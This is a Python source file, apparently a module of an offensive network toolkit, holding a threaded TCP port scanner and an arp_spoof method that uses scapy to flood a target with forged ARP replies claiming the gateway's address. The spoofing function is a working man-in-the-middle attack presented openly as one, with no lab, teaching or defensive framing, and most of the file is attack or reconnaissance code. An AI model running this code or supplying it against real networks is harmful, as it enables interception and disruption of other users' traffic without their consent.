#!/usr/bin/env python3
# modules/network_scanner.py - Network Scanner (Port, ARP)

import socket
import threading
import time

# Import از core
from core.logger import logger
from core.config import Config
from core.utils import get_service_name, parse_port_range

class NetworkScanner:
    def __init__(self, config: Config = None):
        self.config = config or Config()
        self.threads = self.config.get('scanner.threads', 50)
        self.timeout = self.config.get('scanner.timeout', 10)
        self.results = []
    
    def scan_port(self, target: str, port_range: str = "1-1000") -> dict:
        """Port scanner"""
        logger.info(f"Port scanning {target} on {port_range}")
        
        ports = parse_port_range(port_range)
        open_ports = []
        lock = threading.Lock()
        
        def scan_port(port: int):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout / 10)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    with lock:
                        open_ports.append({
                            'port': port,
                            'service': get_service_name(port)
                        })
            except:
                pass
        
        threads = []
        for port in ports:
            if len(threads) >= self.threads:
                for t in threads:
                    t.join()
                threads = []
            t = threading.Thread(target=scan_port, args=(port,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        results = {
            'target': target,
            'type': 'port_scan',
            'open_ports': open_ports
        }
        self.results.append(results)
        return results
    
    def arp_spoof(self, target_ip: str, gateway_ip: str):
        """ARP spoofing attack"""
        logger.warning(f"ARP spoofing between {target_ip} and {gateway_ip}")
        try:
            from scapy.all import ARP, send
            packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
            while True:
                send(packet, verbose=False)
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("ARP spoofing stopped")
        except ImportError:
            logger.error("Scapy not installed: pip install scapy")
    
    def get_results(self) -> list:
        return self.results